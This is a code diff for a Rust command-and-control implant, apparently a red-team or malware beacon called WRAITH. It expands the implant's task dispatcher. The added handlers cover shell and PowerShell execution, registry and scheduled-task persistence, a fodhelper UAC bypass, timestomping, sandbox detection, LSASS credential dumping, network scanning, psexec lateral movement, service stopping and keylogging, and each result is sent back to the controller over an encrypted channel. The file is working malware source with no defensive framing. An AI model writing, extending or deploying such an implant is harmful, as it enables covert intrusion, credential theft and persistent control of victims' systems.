@@ -272,6 +272,7 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
 
 #[derive(Deserialize)]
 struct Task {
+    #[allow(dead_code)]
     id: alloc::string::String,
     #[serde(rename = "type_")]
     task_type: alloc::string::String,
@@ -292,23 +293,83 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
 
     if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
         for task in response.tasks {
-            // Acknowledge task receipt (conceptually, or via log if we had one)
-            let _task_id = &task.id; 
+            let mut result = Vec::new();
 
             match task.task_type.as_str() {
                 "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                 "shell" => {
-                    let shell = crate::modules::shell::Shell;
-                    let output = shell.exec(&task.payload);
-                    
-                    // Send result back (wrapped in WRAITH frame)
-                    let frame = WraithFrame::new(FRAME_TYPE_DATA, output);
-                    let mut buf = [0u8; 8192];
-                    if let Ok(len) = session.write_message(&frame.serialize(), &mut buf) {
-                        let _ = transport.request(&buf[..len]);
+                    result = crate::modules::shell::Shell.exec(&task.payload);
+                },
+                "powershell" => {
+                    result = crate::modules::powershell::PowerShell.exec(&task.payload);
+                },
+                "persist" => {
+                    // Expect payload: "method name path"
+                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
+                    if parts.len() == 3 {
+                        let method = parts[0];
+                        let name = parts[1];
+                        let path = parts[2];
+                        let res = match method {
+                            "registry" => crate::modules::persistence::Persistence.install_registry_run(name, path),
+                            "task" => crate::modules::persistence::Persistence.install_scheduled_task(name, path),
+                            _ => Err(()),
+                        };
+                        result = if res.is_ok() { b"Persistence installed".to_vec() } else { b"Persistence failed".to_vec() };
+                    } else {
+                        result = b"Invalid persist args".to_vec();
                     }
                 },
-                _ => {}
+                "uac_bypass" => {
+                    let res = crate::modules::privesc::PrivEsc.fodhelper(&task.payload);
+                    result = if res.is_ok() { b"Exploit triggered".to_vec() } else { b"Exploit failed".to_vec() };
+                },
+                "timestomp" => {
+                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
+                    if parts.len() == 2 {
+                        let res = crate::modules::evasion::Evasion.timestomp(parts[0], parts[1]);
+                        result = if res.is_ok() { b"Timestomped".to_vec() } else { b"Failed".to_vec() };
+                    }
+                },
+                "sandbox_check" => {
+                    let is_sandbox = crate::modules::evasion::Evasion.is_sandbox();
+                    result = format!("Is Sandbox: {}", is_sandbox).into_bytes();
+                },
+                "dump_lsass" => {
+                    let res = crate::modules::credentials::Credentials.dump_lsass(&task.payload);
+                    result = if res.is_ok() { b"Dump successful".to_vec() } else { b"Dump failed".to_vec() };
+                },
+                "sys_info" => {
+                    result = crate::modules::discovery::Discovery.sys_info().into_bytes();
+                },
+                "net_scan" => {
+                    result = crate::modules::discovery::Discovery.net_scan(&task.payload).into_bytes();
+                },
+                "psexec" => {
+                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
+                    if parts.len() == 3 {
+                        let res = crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
+                        result = if res.is_ok() { b"Service created".to_vec() } else { b"Failed".to_vec() };
+                    }
+                },
+                "service_stop" => {
+                    let res = crate::modules::lateral::Lateral.service_stop(&task.payload);
+                    result = if res.is_ok() { b"Service stopped".to_vec() } else { b"Failed".to_vec() };
+                },
+                "keylogger" => {
+                    result = crate::modules::collection::Collection.keylogger_poll().into_bytes();
+                },
+                _ => {
+                    // Unknown task
+                }
+            }
+
+            if !result.is_empty() {
+                let frame = WraithFrame::new(FRAME_TYPE_DATA, result);
+                let mut buf = [0u8; 8192];
+                if let Ok(len) = session.write_message(&frame.serialize(), &mut buf) {
+                    let _ = transport.request(&buf[..len]);
+                }
             }
         }
     }
